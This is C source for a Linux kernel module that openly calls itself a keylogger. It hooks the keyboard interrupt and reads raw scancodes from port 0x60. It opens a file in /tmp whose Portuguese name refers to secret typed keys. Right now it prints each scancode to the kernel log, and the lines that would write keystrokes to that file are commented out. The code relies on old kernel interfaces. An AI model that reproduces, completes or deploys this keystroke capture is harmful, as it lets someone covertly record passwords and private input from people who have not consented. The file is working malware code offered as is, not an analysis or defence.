#include <asm/io.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/fs.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>

// Functions
struct file *file_open(const char *path, int flags, int rights);
void file_close(struct file *file);
int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);

irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs);
void __exit irq_cleanup(void);

// Global variables
int const keylogger = 0; // Just to use its addres as dev_id
static struct file *keylog = NULL;

// Initialize the module − register the IRQ handler
int init_module() {
	printk(KERN_ALERT "Keylogger started");
	keylog = file_open("/tmp/teclas_secretas_que_foram_digitas.txt", O_RDWR | O_CREAT, 0644);


	return request_irq(1, (irq_handler_t) irq_handler, IRQF_SHARED, "keylogger", (void *)(&keylogger));
}

// This function services keyboard interrupts.
irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs) {
	static unsigned char scancode;


	scancode = inb(0x60); // Get scancode from specific input port.



	printk("Not mapped key!\n");
	printk("Key was: %#2x in hexadecimal\n", scancode);
	printk("Key was: %d in decimal\n\n", scancode);

	// unsigned char *key = &scancode;
	// file_write(keylog, 0, *key, sizeof(*key));

	//file_close(keylog);

	return (irq_handler_t) IRQ_HANDLED;
}

void __exit irq_cleanup(void) {
	printk(KERN_ALERT "Stopping keylogger...\n");
	if(keylog) {
		file_close(keylog);
	}
	free_irq(1, (void *)(&keylogger));
}

struct file *file_open(const char *path, int flags, int rights){
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void file_close(struct file *file){
    filp_close(file, NULL);
}

int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size){
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

module_exit(irq_cleanup);

MODULE_LICENSE("GPL");
